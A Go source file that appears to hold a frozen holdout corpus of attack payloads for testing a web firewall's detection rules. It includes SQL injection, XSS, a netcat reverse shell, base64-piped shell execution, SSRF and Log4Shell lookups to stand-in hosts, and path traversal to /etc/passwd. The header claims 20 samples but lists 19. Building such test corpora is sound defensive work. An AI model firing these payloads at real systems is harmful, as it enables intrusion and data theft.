package payloads

// ============================================================================
// HOOKOUT（冻结语料）—— 读这一行就够了：
//
//	本文件里的语料**永久冻结**。任何情况下都不得为了提升这里的拦截率而修改规则。
//	规则改动后重跑本集，数字下降是**正常且被期待的**，那正说明它测的是泛化能力。
//
// 三条配套纪律（缺一条这套机制就失效）：
//  1. 本集不进 run_w2.sh / run_w4.sh 任何主流程，只用 scripts/run_holdout.sh 单独跑；
//  2. 输出**只报总数，不报明细**——你连哪几条漏了都不知道，就没法针对性修；
//  3. 想看清楚之前先问自己：看了之后你还能忍住不改吗？忍不住就别看。
//
// 为什么需要它：Corpus/HardCases/HardCases2 都在"修完再测"的循环里，最终必然 100%。
// 那是训练集，不是测试集。只有这里没被针对性修过，数字才有意义。
// ============================================================================

// Holdout 返回冻结的 holdout 语料（20 条攻击样本）。
//
// 选材原则：只按「真实攻击者会怎么写」独立构造，不参考本项目任何已有语料与缺口清单。
// 其中有几条大概率会被拦住、几条大概率拦不住——这正是要测的东西。
func Holdout() []Case {
	return []Case{
		// ---- SQLi：非常规恒真与盲注函数 ----
		q("Holdout-SQLI-01", "sqli", "LIKE 恒真", "id=1 AND 1 LIKE 1", true),
		q("Holdout-SQLI-02", "sqli", "SQLServer 延时", "id=1;WAITFOR DELAY '0:0:5'--", true),
		q("Holdout-SQLI-03", "sqli", "盲注字符比较", "id=1 AND ASCII(SUBSTRING((SELECT user()),1,1))>64", true),
		q("Holdout-SQLI-04", "sqli", "PROCEDURE ANALYSE", "id=1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,USER())),1)", true),
		q("Holdout-SQLI-05", "sqli", "注释填空格", "id=1'/**/UNION/**/SELECT/**/1,2,3--", true),

		// ---- XSS：少见的标签与事件 ----
		qp("Holdout-XSS-01", "xss", "math 标签嵌套", "/comment", "c="+urlEnc("<math><mtext><script>alert(1)</script>"), true),
		qp("Holdout-XSS-02", "xss", "iframe srcdoc", "/comment", "c="+urlEnc(`<iframe srcdoc="<script>alert(1)</script>">`), true),
		qp("Holdout-XSS-03", "xss", "冷门事件 onpageshow", "/comment", "c="+urlEnc("<body onpageshow=alert(1)>"), true),
		qp("Holdout-XSS-04", "xss", "data URI 载荷", "/comment", "c="+urlEnc("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="), true),

		// ---- RCE：反弹 shell 与管道解码 ----
		qp("Holdout-RCE-01", "rce", "反弹 shell", "/ping", "host="+urlEnc("1.1.1.1;nc -e /bin/sh 2.2.2.2 4444"), true),
		qp("Holdout-RCE-02", "rce", "base64 管道执行", "/ping", "host="+urlEnc("1.1.1.1|base64 -d|sh"), true),
		qp("Holdout-RCE-03", "rce", "换行分隔命令", "/ping", "host="+urlEnc("1.1.1.1\ncat /etc/passwd"), true),

		// ---- SSRF：userinfo 混淆与完整 IPv6 映射 ----
		qp("Holdout-SSRF-01", "ssrf", "userinfo 混淆", "/fetch", "url="+urlEnc("http://127.0.0.1:80@evil.com/"), true),
		qp("Holdout-SSRF-02", "ssrf", "完整 IPv6 映射", "/fetch", "url="+urlEnc("http://[0:0:0:0:0:ffff:127.0.0.1]/"), true),
		qp("Holdout-SSRF-03", "ssrf", "混合进制 host", "/fetch", "url="+urlEnc("http://0x7f.1:6379/"), true),

		// ---- 反序列化：Log4Shell 后期绕过语法 ----
		{ID: "Holdout-DESER-01", Category: "deserialization", Name: "全 lower 拆分",
			Method: "GET", Path: "/", UA: "${jndi:${lower:l}${lower:d}a${lower:p}://evil/a}", IsAttack: true},
		{ID: "Holdout-DESER-02", Category: "deserialization", Name: "::- 空键绕过",
			Method: "GET", Path: "/", UA: "${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}", IsAttack: true},

		// ---- 路径遍历：编码与反斜杠 ----
		qp("Holdout-TRAV-01", "path-traversal", "全百分号编码", "/download", "f=%2e%2e%2f%2e%2e%2fetc%2fpasswd", true),
		qp("Holdout-TRAV-02", "path-traversal", "反斜杠双写", "/download", "f=....\\\\....\\\\etc\\\\passwd", true),
	}
}
